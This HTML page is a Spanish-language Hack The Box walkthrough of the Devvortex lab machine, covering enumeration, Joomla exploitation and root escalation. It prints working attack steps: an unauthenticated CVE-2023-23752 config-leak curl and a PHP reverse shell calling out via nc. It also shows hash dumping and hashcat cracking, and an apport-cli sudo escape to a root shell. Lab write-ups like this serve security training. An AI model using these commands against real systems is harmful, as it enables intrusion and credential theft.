@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Devvortex | HTB</title>
+
+  <meta name="description" content="Writeup de la máquina Devvortex de Hack The Box: enumeración, explotación y escalada de privilegios." />
+  <meta property="og:title" content="Devvortex | HTB" />
+  <meta property="og:description" content="Writeup de la máquina Devvortex de Hack The Box: enumeración, explotación y escalada de privilegios." />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://phantomcrypter.github.io/writeups/devvortex.html" />
+  <meta property="og:image" content="https://phantomcrypter.github.io/assets/img/og-default.pngg" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link rel="icon" type="image/png" href="../assets/img/favicon.png" />
+
+    <!-- Estilos principales -->
+  <link rel="stylesheet" href="../assets/css/style.css" />
+  <!-- Fuente y resaltado de código -->
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  
+</head>
+<body class="glitch-bg">
+  <nav class="navbar">
+    <ul class="nav-list">
+      <li><a href="../index.html">Inicio</a></li>
+      <li><a href="../projects.html">Proyectos</a></li>
+      <li><a href="../blog.html">Blog</a></li>
+      <li><a href="../notes.html">Notas</a></li>
+      <li><a href="../writeups.html">Writeups</a></li>
+      <li><a href="../about.html">Sobre mí</a></li>
+      <li><a href="../contact.html">Contacto</a></li>
+    </ul>
+  </nav>
+
+  <main class="blog-container">
+    <section class="blog-post">
+      <div class="terminal-box">
+        <a href="../writeups.html">← Volver a Writeups</a>
+        <h1>Devvortex // Linux // Easy // HTB</h1>
+
+        
+        <div class="img-placeholder">
+          <img src="../assets/img/writeups/devvortex/devvortex_banner.webp" alt="Devvortex - placeholder">
+        </div>
+        <br>
+
+        <article>
+
+          <section id="Reconocimiento">
+            <h2>Fase de reconocimiento</h2>
+            <br>  
+            <p>Primero procedo a hacer un análisis de puertos con nmap hacia el servidor:</p>
+             <br>
+            <pre><code class="bash">sudo nmap -sS -p- --open --min-rate 5000 10.129.197.95 -Pn -oA Scaning</code></pre>
+            <br>
+            <ul>
+                <li><strong style="color: aquamarine;">-sS:</strong> Especifico el uso de un escaneo SYN (half-open)</li>
+                <li><strong style="color: aquamarine;">-p-:</strong> Indico que quiero escanear todo el rango de puertos</li>
+                <li><strong style="color: aquamarine;">--open:</strong> Esto me filtra solo por los puertos abiertos</li>
+                <li><strong style="color: aquamarine;">--min-rate 5000:</strong> Esto hace que el escaneo sea más rápido</li>
+                <li><strong style="color: aquamarine;">-Pn:</strong> Esto hace que no haga ping por lo que acelera el escaneo</li>
+                <li><strong style="color: aquamarine;">-oA Scaning:</strong> Guarda el resultado del escaneo en un archivo llamado Scaning, y de esta forma se puede revisar el resultado posteriormente</li>
+            </ul>
+            <br>
+           
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_nmap1.webp" alt="Devvortex - Nmap puertos">
+            </div>
+            <br>
+            <p>El resultado del escaneo muestra que se encuentran abiertos los puertos 22 y el 80, por lo que procedo a hacer un escaneo más profundo en estos puertos para ver si hay versiones vulnerables:</p>
+            <br>
+            <pre><code class="bash">nmap -sCV -p 22,80 10.129.197.95 -oN Versions</code></pre>
+            <br>
+            <ul>
+                <li><strong style="color: aquamarine;">-sCV:</strong> Especifico que quiero hacer un escaneo de scripts básicos de Nmap (C) y de versiones (V)</li>
+                <li><strong style="color: aquamarine;">-p 22,80:</strong> Indico que quiero escanear solo los puertos 22 y 80</li>
+                <li><strong style="color: aquamarine;">-oN Versions:</strong> Guarda el resultado del escaneo en un archivo llamado Versions, y de esta forma se puede revisar el resultado posteriormente</li>
+            </ul>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_nmap2.webp" alt="Devvortex - Nmap versiones">
+            </div>
+            <br>
+            <p>El resultado del escaneo muestra que el puerto 22 tiene un servicio OpenSSH 8.2pp1 y el puerto 80 tiene un nginx 1.18.0.</p>
+            <p>Si vemos con atención el resultado, podemos ver que hay un error  <strong style="color: rgb(195, 0, 255);">"Did not follow redirect to http://devvortex.htb"</strong>. Esto ocurre porque se está aplicando un virtual hosting en el servidor, por lo que para poder acceder al sitio web debemos agregar el dominio a nuestro archivo hosts.</p>
+            <br>
+            <pre><code class="bash">sudo nano /etc/hosts</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_virtual_hosting.webp" alt="Devvortex - virtual hosting">
+            </div>
+            <br>
+            <p>Una vez guardamos los cambios, podemos acceder al sitio web mediante el navegador.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_webpage.webp" alt="Devvortex - webpage">
+            </div>
+            <br>
+            <p>Revisando el código fuente del sitio web y usando whatweb no se ha encontrado información de mucho valor.</p>
+            <p>Por eso luego he decidido hacer un ataque de fuerza bruta a directorios, pero tampoco he encontrado nada de interés.</p>
+            <br>
+            <pre><code class="bash">gobuster dir -u http://devvortex.htb -w /usr/share/wordlists/dirb/common.txt -t 50</code></pre>
+            <p>Continuando con el escaneo, he dicidido hacer otro ataque de fuerza bruta pero esta vez a subdirectorios y si he encontrado información más  útil.</p>
+            <br>
+            <pre><code class="bash">wfuzz -c --hc=404,302 -w /usr/share/SecLists/Discovery/DNS/subdomains-topmillion-11000.txt -H "Host: devvortex.htb" http://devvortex.htb</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_wfuzz.webp" alt="Devvortex - wfuzz">
+            </div>
+            <br>
+            <p>El resultado del ataque de fuerza bruta a subdirectorios muestra que hay un subdirectorio llamado <strong style="color: rgb(195, 0, 255);">dev</strong></p>, y para acceder él debemos agregarlo a nuestro archivo hosts.
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_dev.webp" alt="Devvortex - dev subdirectory">
+            </div>
+            <br>
+            <p>Una vez agregamos el subdirectorio a nuestro archivo hosts, podemos acceder a él mediante el navegador, pero nuevamente, no se ha encontrado información de mucho valor.</p>
+            <p>Por esta razón, he decidido realizar un ataque de fuerza bruta a los archivos dentro del subdirectorio.</p>
+            <br>
+            <pre><code class="bash">gobuster dir -u http://dev.devvortex.htb -w /usr/share/wordlists/dirb/common.txt -t 50</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_gobuster.webp" alt="Devvortex - gobuster">
+            </div>
+            <br>
+            <p>En esta captura lo que más me llama la atención son los directorios <strong style="color: rgb(195, 0, 255);">/administrator</strong> y <strong style="color: rgb(195, 0, 255);">/robots.txt</strong>.</p>
+            <p>Igualmente si entramos al robots.txt no encontramos algún otro directorio de interés.</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_robots.webp" alt="Devvortex - robots.txt">
+            </div>
+            <br>
+            <p>Luego he decidido explorar el directorio /administrator, el cual efectivamente es un panel de administración de Joomla</p>
+            <p>Lo siguiente que podría buscar puede ser la versión de Joomla con la que estamos tratando, pero no se ha mostrado en ninguna parte, por lo que he bucado en internet información de cómo enumerar Joomla</p>
+            <p>Despues de buscar he enontrado este <a href="https://hackertarget.com/joomla-security-testing-guide/" target="_blank">artículo</a> el cual me dice que puedo conseguir la versión revisando el manifest en esta ruta: <strong style="color: rgb(195, 0, 255);">/administrator/manifests/files/joomla.xml</strong></p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_joomla_version.webp" alt="Devvortex - joomla version">
+            </div>
+            <br>
+            <p>Una vez identificada la versión, puedo buscar vulnerabilidades conocidas. Parece indicar que esta versión está afectada por el <strong style="color: rgb(195, 0, 255);">CVE-2023-23752</strong>la cual me permmite exfiltrar datos sensibles.</p>
+            <br>
+            <h2>Explotación</h2>
+            <p>Según este <a href="https://www.vulncheck.com/blog/joomla-for-rce#cve-2023-23752-to-code-execution-1" target="_blank">artículo</a> y este exploit de <a href="https://www.exploit-db.com/exploits/51334" target="_blank">exploit.db</a> basta con hacer un curl a la ruta para extraer los datos de la base de datos y conseguir credenciales</p>
+            <pre><code class="bash">curl -s -k "http://dev.devvortex.htb//api/index.php/v1/config/application?public=true" | jq '.'</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_curl.webp" alt="Devvortex - curl">
+            </div>
+            <br>
+            <p>Una vez tenemos las credenciales, volvemos al panel de administración y colocamos las credenciales obtenidas para obtener acceso al portal</p>
+            <p>Una vez dentro, debemos de enncontrar el template que se está utilizando y crear un nuevo archivo o modificar un archivo existente para colocar una reverse shell en php</p>
+            <pre><code class="php">&lt;?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.13 9443 &gt;/tmp/f"); ?&gt;</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_shell.webp" alt="Devvortex - shell">
+            </div>
+            <br>
+            <p>Una vez la shell está lista y el archivo guardado podemos colocar la escucha con netcat y luego hacer un curl o acceder a la ruta para activar la shell</p>
+            <pre><code class="bash">nc -lvnp 4444</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_shell2.webp" alt="Devvortex - shell2">
+            </div>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_shell3.webp" alt="Devvortex - shell3">
+            </div>
+            <br>
+            <p>Una vez dentro, procedo a hacer el proceso de sanitización para operar de una manera más cómoda: <a href="https://phantomcrypter.github.io/blog/san-tem.html" target="_blank">Sanitización de Terminal</a></p>
+            <p>Cuando ya está lista la terminal, podemos empezar a analizar la VM, y denro podemos notar que somos www-data, que hay un usuario llamado logan y que solo logan puede leer el archivo <strong style="color: rgb(195, 0, 255);">user.txt</strong></p>
+            <p>Cuando estamos tratando con máquinas que contienen un Joomla o WordPress, ellas tienen el servicio de SQL, esto se puede confirmar de la siguiente forma:</p>
+            <br>
+            <pre><code class="bash">ss -tlnp</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_sql.webp" alt="Devvortex - sql">
+            </div>
+            <br>
+            <p>Como podemos observar el puerto 3306 está escuchando, lo que indica la presencia de un servicio MySQL</p>
+            <p>Ahora lo que podemos intentar es una reutilización de credenciales para ingresar a la base de datos</p>
+            <pre><code class="bash">mysql -u logan -p</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_mysql.webp" alt="Devvortex - mysql">
+            </div>
+            <br>
+            <p>Una vez dentro podemos listar las bases de datos:</p>
+            <br>
+            <pre><code class="bash">show databases;</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_mysql2.webp" alt="Devvortex - mysql2">
+            </div>
+            <br>
+            <p>Una vez visualizada la base que nos interesa la seleccionamos y listamos las tablas:</p>
+            <br>
+            <pre><code class="bash">use joomlaa;</code></pre>
+            <pre><code class="bash">show tables;</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_mysql3.webp" alt="Devvortex - mysql3">
+            </div>
+            <br>
+            <p>Una vez vistas las tablas, la que realmente nos interesa es sd4fg_users, así procedemos a seleccionarla para visualizar el contenido:</p>
+            <br>
+            <pre><code class="bash">select * from sd4fg_users;</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_mysql4.webp" alt="Devvortex - mysql4">
+            </div>
+            <br>
+            <p>Pero como podemos observar, los datos están un poco desordenados y son difíciles de interpretar. Para esto le vamos a indicar solo los valores que nos interesan, los cuales son <strong>username</strong> y <strong>password</strong>:</p>
+            <br>
+            <pre><code class="bash">select username, password from sd4fg_users;</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_mysql5.webp" alt="Devvortex - mysql5">
+            </div>
+            <br>
+            <p>Ahora si podemos ver de manera más clara cuales son los hashes de lewis y logan, pero el que nos interesa es el de logan, asi que que lo vamos a copiar y mover a un archivo llamado hash en nuestro entorno local</p>
+            <p>También podemos hacer uso de la herramienta hashid para saber cual es el tipo de hash estamos tratando</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_hashid.webp" alt="Devvortex - hashid">
+            </div>
+            <br>
+            <p>Como podemos observar con esto ya podemos hacer uso de la herramienta hashcat para intentar romper el hash, ya que ya sabemos con qué tipo de hash estamos tratando</p>
+            <p>Al leer la documentación de hashcat, podemos ver que el modo correcto para bcrypt es el modo 3200</p>
+            <br>
+            <pre><code class="bash">hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_hashcat.webp" alt="Devvortex - hashcat">
+            </div>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_hashcat2.webp" alt="Devvortex - hashcat2">
+            </div>
+            <br>
+            <p>Al tener las credenciales de logan, podemos usarlas para acceder al sistema ya sea cambiando el usuario con <strong style="color:blueviolet">su</strong> o utilizando <strong style="color:blueviolet">SSH</strong></p>
+            <br>
+            <h2>Escalada de privilegios</h2>
+            <p>Una vez dentro como logan, procedo con la enumeración de permisos para entender qué puede hacer logan dentro del equipo</p>
+            <p>Al hacer uso de <strong style="color:blueviolet">sudo -l</strong> puedo ver qué puedo hace uso de /usr/bin/apport-cli como usuario root</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_sudo.webp" alt="Devvortex - sudo">
+            </div>
+            <br>
+            <p>Una búsqueda rápida en google nos dice que apport-cli es un programa que recolecta información sobre fallos en el sistema para depuración</p>
+            <p>También podemos ver que tiene una <a href="https://github.com/diego-tella/cve-2023-1326-poc" target="_blank">vulnerabilidad</a> la cual permite la escalada de privilegios en el sistema ejecutando comandos en el apartado de visualización del reporte</p>
+            <p>Ahora sabiendo esto, vemos que tenemos que ingresar un PID y para eso vamos a usar <strong style="color:blueviolet">ps aux</strong></p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_pid.webp" alt="Devvortex - pid">
+            </div>
+            <br>
+            <p>Una vez ya tenemos el PID, podemos usarlo para interactuar con el programa y aprovechar la vulnerabilidad</p>
+            <pre><code class="bash">sudo /usr/bin/apport-cli -f -P  2167</code></pre>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_root.webp" alt="Devvortex - root">
+            </div>
+            <br>
+            <p>Cuando lleguemos al apartado de visualización del reporte, podemos ejecutar comandos como el usuario root</p>
+            <p>El comando que ejecutamos será: <strong style="color:blueviolet">!/bin/bash</strong></p>
+            <p>Y al ejecutar enter obtendremos una shell como root</p>
+            <div class="img-placeholder">
+              <img src="../assets/img/writeups/devvortex/devvortex_root2.webp" alt="Devvortex - root2">
+            </div>
+            <br>
+            <p>Con esto, se haa completado el writeup de la máquina Devvortex de Hack The Box, demostrando cómo identificar y explotar la vulnerabilidad en Joomla para obtener acceso a datos sensibles, y luego escalar privilegios aprovechadnome del comando sudo para ejeccutar comandos como root en un programa de generación de reportes.</p>
+              <br>
+            <p>C:\También pueden visitar el video explicativo de la máquina en mi canal de YouTube: <a href="https://www.youtube.com/watch?v=JsdFq1ANT_0" target="_blank">Resolución de la Máquina Devvortex | HTB</a></p>
+            <br>
+         <footer class="post-footer">
+            <span class="post-date"><time datetime="2026-10-30">2026-10-30</time></span>
+            <div class="post-social">
+                <p>[ contact ]</p>
+                <a href="https://www.twitch.tv/kallrize" target="_blank">twitch</a>
+                <a href="https://www.youtube.com/@kallrizeklr5364" target="_blank">Youtube</a>
+                <a href="https://www.linkedin.com/in/gabrielp%C3%A9rez-959645213" target="_blank">linkedin</a>
+            </div>
+        </footer>
+        </article>
+      </div>
+    </section>
+  </main>
+</body>
+</html>
